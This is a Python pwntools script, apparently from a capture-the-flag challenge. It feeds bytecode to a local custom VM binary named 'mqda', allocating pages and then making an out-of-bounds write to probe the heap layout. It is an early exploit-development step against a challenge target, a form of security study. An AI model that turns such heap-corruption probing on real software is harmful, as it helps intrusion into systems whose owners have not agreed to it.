#!/usr/bin/env python3
"""
Test heap layout to understand OOB write target.
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def hlt():
    return bytes([0x00])

def main():
    # Allocate pages at sequential addresses to test heap layout
    code = b''
    
    # Allocate page 0x000 (at SP=0x00)
    code += mov_reg_imm(15, 0x00)
    code += mov_reg_imm(0, 0xAAAAAAAA)
    code += push_reg(0)
    
    # Allocate page 0x100 (at SP=0x100)  
    code += mov_reg_imm(15, 0x100)
    code += mov_reg_imm(0, 0xBBBBBBBB)
    code += push_reg(0)
    
    # Allocate page 0x200 (at SP=0x200)
    code += mov_reg_imm(15, 0x200)
    code += mov_reg_imm(0, 0xCCCCCCCC)
    code += push_reg(0)
    
    # Now do OOB write on page 0x100 at offset 0xFF
    # This should write into page 0x200's chunk header or data
    code += mov_reg_imm(15, 0x1FF)  # page 0x100, offset 0xFF
    code += mov_reg_imm(0, 0xDEADBEEF)
    code += push_reg(0)
    
    code += hlt()
    
    print(f"[*] Code length: {len(code)}")
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=2)
    print(f"[*] Output: {output}")
    p.close()

if __name__ == '__main__':
    main()
